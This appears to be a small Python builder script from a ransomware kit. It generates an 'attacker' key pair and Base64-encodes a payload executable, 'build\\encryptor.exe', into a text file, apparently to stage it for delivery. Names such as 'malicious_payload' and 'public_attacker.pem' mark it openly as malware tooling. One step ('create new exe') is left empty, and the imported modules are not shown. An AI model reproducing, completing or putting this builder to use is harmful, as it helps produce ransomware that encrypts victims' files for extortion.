from keygen import *
from B64 import *

class Builder:

    def __init__(self):
        self.file = ""
        self.outputfile = "malicious_code.txt"
        self.encoded_code = ""

    def generate_attacker_keys(self):
        keygen = Encryption("id:variant1", f"build\\public_attacker.pem",f"build\\private_attacker.pem")
        keygen.generate_keys()



if __name__ == "__main__":
    encodeclass = Encode()
    builder = Builder()
    
    # generate new keypair
    builder.generate_attacker_keys()

    #create new exe

    #BS64 encode EXE
    with open("build\\encryptor.exe", "rb") as malicious_payload:
        payload = malicious_payload.read()
        encoded_payload = encodeclass.encode(payload)

    with open("build\\encoded_code.txt", "w") as text_file:
        text_file.write(encoded_payload)